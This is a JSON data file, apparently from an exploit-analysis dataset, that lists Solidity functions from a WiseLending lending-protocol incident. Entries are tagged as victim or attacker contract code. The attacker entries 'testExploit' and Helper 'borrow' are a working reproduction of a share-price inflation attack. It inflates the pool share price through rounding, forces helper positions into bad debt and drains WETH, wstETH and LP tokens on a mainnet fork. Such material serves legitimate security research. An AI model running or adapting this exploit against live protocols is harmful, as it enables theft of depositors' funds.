@@ -1,0 +1,289 @@
+[
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "borrowExactAmount",
+    "original_code": "    function borrowExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        _checkOwnerPosition(\n            _nftId,\n            msg.sender\n        );\n\n        uint256 shares = calculateBorrowShares(\n            {\n                _poolToken: _poolToken,\n                _amount: _amount,\n                _maxSharePrice: true\n            }\n        );\n\n        _coreBorrowTokens(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: _poolToken,\n                _amount: _amount,\n                _shares: shares,\n                _onBehalf: false\n            }\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _amount\n        );\n\n        return shares;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "depositExactAmount",
+    "original_code": "    function depositExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (\n            uint256,\n            uint256\n        )\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewMintShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares == 0) {\n            revert NotEnoughLpAssetsTransferred();\n        }\n\n        uint256 reducedShares = _applyMintFee(\n            shares\n        );\n\n        uint256 feeShares = shares\n            - reducedShares;\n\n        if (feeShares == 0) {\n            revert ZeroFee();\n        }\n\n        if (reducedShares == feeShares) {\n            revert TooMuchFee();\n        }\n\n        _mint(\n            msg.sender,\n            reducedShares\n        );\n\n        _mint(\n            PENDLE_POWER_FARM_CONTROLLER,\n            feeShares\n        );\n\n        underlyingLpAssetsCurrent += _underlyingLpAssetAmount;\n\n        _safeTransferFrom(\n            UNDERLYING_PENDLE_MARKET,\n            msg.sender,\n            PENDLE_POWER_FARM_CONTROLLER,\n            _underlyingLpAssetAmount\n        );\n\n        return (\n            reducedShares,\n            feeShares\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "getPositionLendingShares",
+    "original_code": "    function getPositionLendingShares(\n        uint256 _nftId,\n        address _poolToken\n    )\n        external\n        view\n        returns (uint256)\n    {\n        return userLendingData[_nftId][_poolToken].shares;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "getTotalPool",
+    "original_code": "    function getTotalPool(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return globalPoolData[_poolToken].totalPool;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "lendingPoolData",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "mintPosition",
+    "original_code": "    function mintPosition()\n        external\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "withdrawExactAmount",
+    "original_code": "    function withdrawExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewBurnShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares > balanceOf(msg.sender)) {\n            revert NotEnoughShares();\n        }\n\n        _burn(\n            msg.sender,\n            shares\n        );\n\n        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;\n\n        _withdrawLp(\n            msg.sender,\n            _underlyingLpAssetAmount\n        );\n\n        return shares;\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWiseLending",
+    "source_type": "victim_contract",
+    "function_name": "withdrawExactShares",
+    "original_code": "    function withdrawExactShares(\n        uint256 _shares\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_shares == 0) {\n            revert ZeroAmount();\n        }\n\n        if (_shares > balanceOf(msg.sender)) {\n            revert InsufficientShares();\n        }\n\n        uint256 tokenAmount = previewAmountWithdrawShares(\n            _shares,\n            underlyingLpAssetsCurrent\n        );\n\n        underlyingLpAssetsCurrent -= tokenAmount;\n\n        _burn(\n            msg.sender,\n            _shares\n        );\n\n        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n            return tokenAmount;\n        }\n\n        _withdrawLp(\n            msg.sender,\n            tokenAmount\n        );\n\n        return tokenAmount;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(\n        address owner,\n        address spender\n    )\n        external\n        view\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(\n        address _spender,\n        uint256 _amount\n    )\n        external\n        returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(\n        address _account\n    )\n        external\n        view\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals()\n        external\n        view\n        returns (uint8);\n\n    event Transfer(\n        address indexed from,\n        address indexed to,\n        uint256 value\n    );\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    event  Deposit(\n        address indexed dst,\n        uint wad\n    );\n\n    event  Withdrawal(\n        address indexed src,\n        uint wad\n    );\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(\n        address _receiver,\n        address _tokenIn,\n        uint256 _amountTokenToDeposit,\n        uint256 _minSharesOut\n    )\n        external\n        returns (uint256 sharesAmount);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name()\n        external\n        view\n        returns (string memory)\n    {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol()\n        external\n        view\n        returns (string memory)\n    {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply()\n        external\n        view\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(\n        address _recipient,\n        uint256 _amount\n    )\n        external\n        returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address _sender,\n        address _recipient,\n        uint256 _amount\n    )\n        external\n        returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw()\n        external\n        returns (uint128);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.label(address(PendleLPT), \"PendleLPT\");\n        vm.label(address(LPTPoolToken), \"LPTPoolToken\");\n        vm.label(address(wiseLending), \"wiseLending\");\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(PositionNFTs), \"PositionNFTs\");\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WiseLending",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(PendleLPT), address(this), 520_539_781_914_590_517_894);\n\n        emit log_named_decimal_uint(\"Attacker PendleLPT Balance before exploit\", PendleLPT.balanceOf(address(this)), 18);\n\n        PendleLPT.approve(address(LPTPoolToken), type(uint256).max);\n        LPTPoolToken.depositExactAmount(PendleLPT.balanceOf(address(this)));\n        LPTPoolToken.approve(address(wiseLending), type(uint256).max);\n\n        // set WiseLending pool state: pseudoTotalPool(underlying): 2 wei, totalDepositShares(share): 1 wei\n        // see below tx: https://etherscan.io/tx/0x67d6c554314c9b306d683afb3bc4a10e70509ceb0fdf8415a5e270a91fae52de\n        vm.startPrank(attackerContract);\n        PositionNFTs.transferFrom(attackerContract, address(this), 8);\n        vm.stopPrank();\n\n        console.log(\"\\n 1. set wiseLending pool state\");\n        wiseLending.withdrawExactShares(\n            8, address(LPTPoolToken), wiseLending.getPositionLendingShares(8, address(LPTPoolToken))\n        );\n        (uint256 underlyingAmount, uint256 shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending pool state now, underlyingAmount:\", underlyingAmount, \"shareAmount: \", shareAmount);\n        console.log(\"wiseLending Share Price 1: \", underlyingAmount / shareAmount);\n\n        // inflae share price by donate LPTPoolToken to the wiseLending\n        while (underlyingAmount / shareAmount < 36 ether) {\n            wiseLending.depositExactAmount(8, address(LPTPoolToken), underlyingAmount * 2 - 1); //Since rounding in favor of the protocol, deposit 2x - 1 underlying, mint 1 share\n            wiseLending.withdrawExactAmount(8, address(LPTPoolToken), 1); // withdraw 1 underlying, burn 1 share\n            (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        }\n        console.log(\"\\n 2. Donate LPTPoolToken to wiseLending by rounding in favor of the protocol\");\n        console.log(\"WiseLending pool state now, underlyingAmount:\", underlyingAmount, \"shareAmount: \", shareAmount);\n        console.log(\"wiseLending Share Price 2: \", underlyingAmount / shareAmount);\n\n        //Mint 6 shares for withdraw donate LPTPoolToken\n        console.log(\"\\n 3. Mint 6 shares for withdraw donate LPTPoolToken\");\n        wiseLending.depositExactAmount(8, address(LPTPoolToken), 6 * underlyingAmount);\n\n        // Open a position to borrow assets in 6 new accounts\n        // Donate position collateral to the wiseLending pool through the incorrect health factor check\n        console.log(\"\\n 4. Open positions to borrow assets and further inflae the share price\");\n        for (uint256 i = 0; i < 6; i++) {\n            helpers[i] = new Helper();\n        }\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        LPTPoolToken.transfer(address(helpers[0]), underlyingAmount / shareAmount + 10);\n        helpers[0].borrow(wstETH, underlyingAmount / shareAmount + 1, 43_767_595_652_604_943_692);\n\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending Share Price 3: \", underlyingAmount / shareAmount);\n        LPTPoolToken.transfer(address(helpers[1]), underlyingAmount / shareAmount + 10);\n        helpers[1].borrow(wstETH, underlyingAmount / shareAmount + 1, 50_020_109_317_262_792_792);\n\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending Share Price 4: \", underlyingAmount / shareAmount);\n        LPTPoolToken.transfer(address(helpers[2]), underlyingAmount / shareAmount + 10);\n        helpers[2].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 23_443_463_776_915_873_010);\n\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending Share Price 5: \", underlyingAmount / shareAmount);\n        LPTPoolToken.transfer(address(helpers[3]), underlyingAmount / shareAmount + 10);\n        helpers[3].borrow(WETH, underlyingAmount / shareAmount + 1, 73_498_936_139_651_450_633);\n\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending Share Price 6: \", underlyingAmount / shareAmount);\n        LPTPoolToken.transfer(address(helpers[4]), underlyingAmount / shareAmount + 10);\n        helpers[4].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 27_742_814_258_725_671_652);\n\n        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));\n        console.log(\"WiseLending Share Price 7: \", underlyingAmount / shareAmount);\n        LPTPoolToken.transfer(address(helpers[5]), underlyingAmount / shareAmount + 10);\n        helpers[5].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 48_332_561_371_175_655_788);\n\n        // Withdraw donated LPTPoolTokens due to the increase in share price\n        console.log(\"\\n 5. Withdraw donated LPTPoolTokens due to the increase in share price\");\n        wiseLending.withdrawExactAmount(8, address(LPTPoolToken), wiseLending.getTotalPool(address(LPTPoolToken)));\n\n        LPTPoolToken.withdrawExactShares(LPTPoolToken.balanceOf(address(this)));\n\n        emit log_named_decimal_uint(\n            \"\\n Attacker PendleLPT Balance After exploit\", PendleLPT.balanceOf(address(this)), 18\n        );\n\n        emit log_named_decimal_uint(\"Attacker WETH Balance After exploit\", WETH.balanceOf(address(this)), 18);\n\n        emit log_named_decimal_uint(\"Attacker wstETH Balance After exploit\", wstETH.balanceOf(address(this)), 18);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "burn",
+    "original_code": "    function burn(\n        address _receiverAddressSy,\n        address _receiverAddressPt,\n        uint256 _lpToBurn\n    )\n        external\n        returns (\n            uint256 syOut,\n            uint256 ptOut\n        );\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "getApproved",
+    "original_code": "    function getApproved(\n        uint256 _nftId\n    )\n        external\n        view\n        returns (address);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "isApprovedForAll",
+    "original_code": "    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\n        return _operatorApprovals[owner][operator];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "ownerOf",
+    "original_code": "    function ownerOf(\n        uint256 _nftId\n    )\n        external\n        view\n        returns (address);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "safeTransferFrom",
+    "original_code": "    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PositionManager",
+    "source_type": "victim_contract",
+    "function_name": "setApprovalForAll",
+    "original_code": "    function setApprovalForAll(address operator, bool approved) public virtual override {\n        _setApprovalForAll(_msgSender(), operator, approved);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Helper",
+    "source_type": "attacker_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(IERC20 asset, uint256 collateralAmount, uint256 debtAmount) external {\n        uint256 positionId = PositionNFTs.mintPosition();\n        LPTPoolToken.approve(address(wiseLending), type(uint256).max);\n        wiseLending.depositExactAmount(positionId, address(LPTPoolToken), collateralAmount); // deposit collateral\n        wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset\n\n        // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt\n        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1);\n\n        asset.transfer(msg.sender, asset.balanceOf(address(this)));\n        LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Helper",
+    "source_type": "attacker_contract",
+    "function_name": "onERC721Received",
+    "original_code": "    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n",
+    "description": ""
+  }
+]
